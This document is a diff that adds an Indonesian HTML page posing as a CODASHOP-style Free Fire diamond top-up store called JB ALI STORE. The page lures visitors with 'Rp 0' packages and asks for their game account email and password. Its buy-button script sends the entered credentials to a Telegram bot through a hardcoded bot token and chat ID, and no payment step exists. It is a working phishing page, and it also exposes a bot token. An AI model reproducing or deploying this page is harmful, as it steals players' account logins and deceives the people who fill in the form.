@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Top Up Free Fire - CODASHOP</title>
+    
+    <!-- TailwindCSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: {
+                            light: '#60a5fa',
+                            DEFAULT: '#3b82f6',
+                            dark: '#2563eb'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <!-- Animate.css -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    
+    <!-- AOS -->
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            scroll-behavior: smooth;
+        }
+        
+        .payment-method, .diamond-package {
+            transition: all 0.3s ease;
+        }
+        
+        .payment-method:hover, .diamond-package:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 25px -5px rgba(59, 130, 246, 0.4);
+        }
+        
+        .selected {
+            border: 2px solid #3b82f6;
+            box-shadow: 0 10px 25px -5px rgba(59, 130, 246, 0.4);
+        }
+        
+        .btn-buy {
+            transition: all 0.3s ease;
+        }
+        
+        .btn-buy:hover {
+            background-color: #2563eb;
+            transform: scale(1.05);
+        }
+        
+        .input-field:focus {
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.3);
+        }
+        
+        /* Animasi untuk notifikasi */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .notification {
+            animation: fadeIn 0.5s ease forwards;
+        }
+        
+        /* Loading spinner */
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #fff;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <!-- Hero Banner -->
+    <section class="relative h-96 flex items-center justify-center">
+        <div class="absolute inset-0 bg-black opacity-50 z-0"></div>
+        <div class="absolute inset-0 z-0 bg-cover bg-center" style="background-image: url('https://litter.catbox.moe/s7xmdz614cva11ba.jpg"></div>
+        <div class="absolute inset-0 bg-white opacity-20 z-0"></div>
+        
+        <div class="relative z-10 text-center text-white px-4" data-aos="fade-up" data-aos-duration="1000">
+            <h1 class="text-4xl md:text-5xl font-bold mb-4 animate__animated animate__fadeInUp">Top Up Free Fire</h1>
+            <p class="text-xl md:text-2xl mb-8 animate__animated animate__fadeInUp animate__delay-1s">Diamond murah, cepat, dan aman hanya di JB ALI STORE</p>
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 py-12 max-w-6xl">
+        <!-- Form Top Up -->
+        <div class="bg-white rounded-xl shadow-lg p-6 mb-12" data-aos="zoom-in" data-aos-duration="800">
+            <h2 class="text-2xl font-bold text-primary mb-6 text-center">Form Top Up Free Fire</h2>
+            
+            <form id="topup-form" class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                    <label for="name" class="block text-gray-700 mb-2">EMAIL AKUN</label>
+                    <input type="text" id="name" class="w-full px-4 py-3 rounded-lg border border-primary-light input-field focus:outline-none focus:ring-2 focus:ring-primary" required>
+                </div>
+                
+                <div>
+                    <label for="uid" class="block text-gray-700 mb-2">PASSWORD AKUN</label>
+                    <input type="text" id="uid" class="w-full px-4 py-3 rounded-lg border border-primary-light input-field focus:outline-none focus:ring-2 focus:ring-primary" required>
+                </div>
+                
+                <div>
+                    <label for="whatsapp" class="block text-gray-700 mb-2">UID GAME</label>
+                    <input type="tel" id="whatsapp" class="w-full px-4 py-3 rounded-lg border border-primary-light input-field focus:outline-none focus:ring-2 focus:ring-primary" required>
+                </div>
+                
+                <div>
+                    <label for="email" class="block text-gray-700 mb-2">NAMA LENGKAP</label>
+                    <input type="email" id="email" class="w-full px-4 py-3 rounded-lg border border-primary-light input-field focus:outline-none focus:ring-2 focus:ring-primary" required>
+                </div>
+            </form>
+        </div>
+
+        <!-- Metode Pembayaran -->
+        <div class="mb-12" data-aos="fade-up" data-aos-duration="800">
+            <h2 class="text-2xl font-bold text-primary mb-6 text-center">Pilih Metode Pembayaran</h2>
+            
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                <!-- BCA -->
+                <div class="payment-method bg-white rounded-xl shadow p-4 flex items-center justify-center cursor-pointer" data-method="BCA">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/2560px-Bank_Central_Asia.svg.png" alt="BCA" class="h-12 object-contain">
+                </div>
+                
+                <!-- BNI -->
+                <div class="payment-method bg-white rounded-xl shadow p-4 flex items-center justify-center cursor-pointer" data-method="BNI">
+                    <img src="https://litter.catbox.moe/a09ipypp4g0jfqev.jpeg" alt="BNI" class="h-12 object-contain">
+                </div>
+                
+                <!-- BRI -->
+                <div class="payment-method bg-white rounded-xl shadow p-4 flex items-center justify-center cursor-pointer" data-method="BRI">
+                    <img src="https://litter.catbox.moe/0li4qrx1fishctwf.png" alt="BRI" class="h-12 object-contain">
+                </div>
+                
+                <!-- Mandiri -->
+                <div class="payment-method bg-white rounded-xl shadow p-4 flex items-center justify-center cursor-pointer" data-method="Mandiri">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Bank_Mandiri_logo_2016.svg/1000px-Bank_Mandiri_logo_2016.svg.png" alt="Mandiri" class="h-12 object-contain">
+                </div>
+                
+                <!-- OVO -->
+                <div class="payment-method bg-white rounded-xl shadow p-4 flex items-center justify-center cursor-pointer" data-method="OVO">
+                    <img src="https://litter.catbox.moe/8t23qx5ygtlsvvw7.jpg" alt="OVO" class="h-12 object-contain">
+                </div>
+                
+                <!-- GoPay -->
+                <div class="payment-method bg-white rounded-xl shadow p-4 flex items-center justify-center cursor-pointer" data-method="GoPay">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Gopay_logo.svg/1280px-Gopay_logo.svg.png" alt="GoPay" class="h-12 object-contain">
+                </div>
+                
+                <!-- Dana -->
+                <div class="payment-method bg-white rounded-xl shadow p-4 flex items-center justify-center cursor-pointer" data-method="DANA">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/1280px-Logo_dana_blue.svg.png" alt="DANA" class="h-12 object-contain">
+                </div>
+                
+                <!-- ShopeePay -->
+                <div class="payment-method bg-white rounded-xl shadow p-4 flex items-center justify-center cursor-pointer" data-method="ShopeePay">
+                    <img src="https://litter.catbox.moe/oi1aufae2ywi330y.png" alt="ShopeePay" class="h-12 object-contain">
+                </div>
+            </div>
+        </div>
+
+        <!-- Paket Diamond -->
+        <div class="mb-12" data-aos="fade-up" data-aos-duration="800">
+            <h2 class="text-2xl font-bold text-primary mb-6 text-center">Pilih Paket Diamond</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <!-- Paket 50 Diamond -->
+                <div class="diamond-package bg-white rounded-xl shadow p-6 cursor-pointer" data-diamond="50" data-price="8200">
+                    <h3 class="text-xl font-bold text-primary text-center mb-2">50 Diamond</h3>
+                    <p class="text-gray-700 text-center">Rp 0</p>
+                </div>
+                
+                <!-- Paket 100 Diamond -->
+                <div class="diamond-package bg-white rounded-xl shadow p-6 cursor-pointer" data-diamond="100" data-price="14200">
+                    <h3 class="text-xl font-bold text-primary text-center mb-2">100 Diamond</h3>
+                    <p class="text-gray-700 text-center">Rp 0</p>
+                </div>
+                
+                <!-- Paket 140 Diamond -->
+                <div class="diamond-package bg-white rounded-xl shadow p-6 cursor-pointer" data-diamond="140" data-price="19481">
+                    <h3 class="text-xl font-bold text-primary text-center mb-2">140 Diamond</h3>
+                    <p class="text-gray-700 text-center">Rp 0</p>
+                </div>
+                
+                <!-- Paket 355 Diamond -->
+                <div class="diamond-package bg-white rounded-xl shadow p-6 cursor-pointer" data-diamond="355" data-price="48675">
+                    <h3 class="text-xl font-bold text-primary text-center mb-2">355 Diamond</h3>
+                    <p class="text-gray-700 text-center">Rp 48.675</p>
+                </div>
+                
+                <!-- Paket 720 Diamond -->
+                <div class="diamond-package bg-white rounded-xl shadow p-6 cursor-pointer" data-diamond="720" data-price="96938">
+                    <h3 class="text-xl font-bold text-primary text-center mb-2">720 Diamond</h3>
+                    <p class="text-gray-700 text-center">Rp 96.938</p>
+                </div>
+                
+                <!-- Paket 1450 Diamond -->
+                <div class="diamond-package bg-white rounded-xl shadow p-6 cursor-pointer" data-diamond="1450" data-price="190700">
+                    <h3 class="text-xl font-bold text-primary text-center mb-2">1450 Diamond</h3>
+                    <p class="text-gray-700 text-center">Rp 190.700</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tombol Buy -->
+        <div class="text-center" data-aos="zoom-in" data-aos-duration="800">
+            <button id="buy-button" class="btn-buy bg-primary hover:bg-primary-dark text-white font-bold py-4 px-12 rounded-xl text-lg animate__animated animate__pulse animate__infinite">
+                <span>Beli Sekarang</span>
+                <div class="spinner mx-auto mt-2"></div>
+            </button>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-white py-8">
+        <div class="container mx-auto px-4 text-center">
+            <h3 class="text-xl font-bold text-primary mb-4">JB ALI STORE</h3>
+            <p class="text-gray-600 mb-4">createdby ALI STORE</p>
+            
+            <div class="flex flex-wrap justify-center gap-4 mb-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/2560px-Bank_Central_Asia.svg.png" alt="BCA" class="h-8 object-contain">
+                <img src="https://litter.catbox.moe/a09ipypp4g0jfqev.jpeg" alt="BNI" class="h-8 object-contain">
+                <img src="https://files.catbox.moe/t09hyl.png" alt="BRI" class="h-8 object-contain">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Bank_Mandiri_logo_2016.svg/1000px-Bank_Mandiri_logo_2016.svg.png" alt="Mandiri" class="h-8 object-contain">
+                <img src="https://files.catbox.moe/gev3e5.jpeg" alt="OVO" class="h-8 object-contain">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Gopay_logo.svg/1280px-Gopay_logo.svg.png" alt="GoPay" class="h-8 object-contain">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/1280px-Logo_dana_blue.svg.png" alt="DANA" class="h-8 object-contain">
+                <img src="https://files.catbox.moe/cy7z34.png" alt="ShopeePay" class="h-8 object-contain">
+            </div>
+            
+            <p class="text-gray-500 text-sm">© 2023 JB ALI STORE. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <!-- Notifikasi -->
+    <div id="notification" class="fixed top-4 right-4 p-4 rounded-lg shadow-lg hidden notification">
+        <p id="notification-message" class="text-white"></p>
+    </div>
+
+    <script>
+        // Inisialisasi AOS
+        document.addEventListener('DOMContentLoaded', function() {
+            AOS.init({
+                duration: 800,
+                once: true
+            });
+            
+            // Animasi untuk elemen dengan Animate.css
+            const elements = document.querySelectorAll('.payment-method, .diamond-package');
+            elements.forEach(el => {
+                el.classList.add('animate__animated');
+            });
+        });
+
+        // Pilih metode pembayaran
+        const paymentMethods = document.querySelectorAll('.payment-method');
+        let selectedMethod = null;
+
+        paymentMethods.forEach(method => {
+            method.addEventListener('click', function() {
+                paymentMethods.forEach(m => m.classList.remove('selected', 'animate__pulse'));
+                this.classList.add('selected', 'animate__pulse');
+                selectedMethod = this.getAttribute('data-method');
+            });
+            
+            // Efek hover
+            method.addEventListener('mouseenter', function() {
+                if (!this.classList.contains('selected')) {
+                    this.classList.add('animate__pulse');
+                }
+            });
+            
+            method.addEventListener('mouseleave', function() {
+                if (!this.classList.contains('selected')) {
+                    this.classList.remove('animate__pulse');
+                }
+            });
+        });
+
+        // Pilih paket diamond
+        const diamondPackages = document.querySelectorAll('.diamond-package');
+        let selectedPackage = null;
+        let selectedPackageDiamond = null;
+        let selectedPackagePrice = null;
+
+        diamondPackages.forEach(pkg => {
+            pkg.addEventListener('click', function() {
+                diamondPackages.forEach(p => p.classList.remove('selected', 'animate__pulse'));
+                this.classList.add('selected', 'animate__pulse');
+                selectedPackage = this;
+                selectedPackageDiamond = this.getAttribute('data-diamond');
+                selectedPackagePrice = this.getAttribute('data-price');
+            });
+            
+            // Efek hover
+            pkg.addEventListener('mouseenter', function() {
+                if (!this.classList.contains('selected')) {
+                    this.classList.add('animate__pulse');
+                }
+            });
+            
+            pkg.addEventListener('mouseleave', function() {
+                if (!this.classList.contains('selected')) {
+                    this.classList.remove('animate__pulse');
+                }
+            });
+        });
+
+        // Tombol Buy
+        const buyButton = document.getElementById('buy-button');
+        const spinner = document.querySelector('.spinner');
+        const notification = document.getElementById('notification');
+        const notificationMessage = document.getElementById('notification-message');
+
+        buyButton.addEventListener('click', function() {
+            // Validasi form
+            const name = document.getElementById('name').value;
+            const uid = document.getElementById('uid').value;
+            const whatsapp = document.getElementById('whatsapp').value;
+            const email = document.getElementById('email').value;
+            
+            if (!name || !uid || !whatsapp || !email) {
+                showNotification('Harap isi semua field yang diperlukan!', 'red');
+                return;
+            }
+            
+            if (!selectedMethod) {
+                showNotification('Harap pilih metode pembayaran!', 'red');
+                return;
+            }
+            
+            if (!selectedPackage) {
+                showNotification('Harap pilih paket diamond!', 'red');
+                return;
+            }
+            
+            // Tampilkan loading
+            buyButton.disabled = true;
+            spinner.style.display = 'block';
+            
+            // Format pesan untuk Telegram
+            const message = `📢 New Top Up Order%0A🎮 Game: Free Fire%0A👤 Nama: ${name}%0A🆔 UID: ${uid}%0A📱 WhatsApp: ${whatsapp}%0A✉️ Email: ${email}%0A💳 Metode Pembayaran: ${selectedMethod}%0A📦 Paket: ${selectedPackageDiamond} Diamond — Rp ${selectedPackagePrice}`;
+            
+            // Ganti dengan token bot dan chat ID Anda
+            const botToken = '8418392697:AAHGpg-clz7pZ41kPZUzJRiYUseSU6ZE-D8';
+            const chatId = '7221161888';
+            
+            // Kirim ke Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, {
+                method: 'GET'
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    showNotification('Pesanan berhasil dikirim! Kami akan segera menghubungi Anda.', 'green');
+                    
+                    // Reset form
+                    document.getElementById('topup-form').reset();
+                    paymentMethods.forEach(m => m.classList.remove('selected', 'animate__pulse'));
+                    diamondPackages.forEach(p => p.classList.remove('selected', 'animate__pulse'));
+                    selectedMethod = null;
+                    selectedPackage = null;
+                } else {
+                    showNotification('Terjadi kesalahan. Silakan coba lagi.', 'red');
+                }
+            })
+            .catch(error => {
+                showNotification('Terjadi kesalahan. Silakan coba lagi.', 'red');
+                console.error('Error:', error);
+            })
+            .finally(() => {
+                // Sembunyikan loading
+                buyButton.disabled = false;
+                spinner.style.display = 'none';
+            });
+        });
+
+        // Fungsi untuk menampilkan notifikasi
+        function showNotification(message, color) {
+            notification.style.backgroundColor = color;
+            notificationMessage.textContent = message;
+            notification.classList.remove('hidden');
+            
+            // Sembunyikan notifikasi setelah 5 detik
+            setTimeout(() => {
+                notification.classList.add('hidden');
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
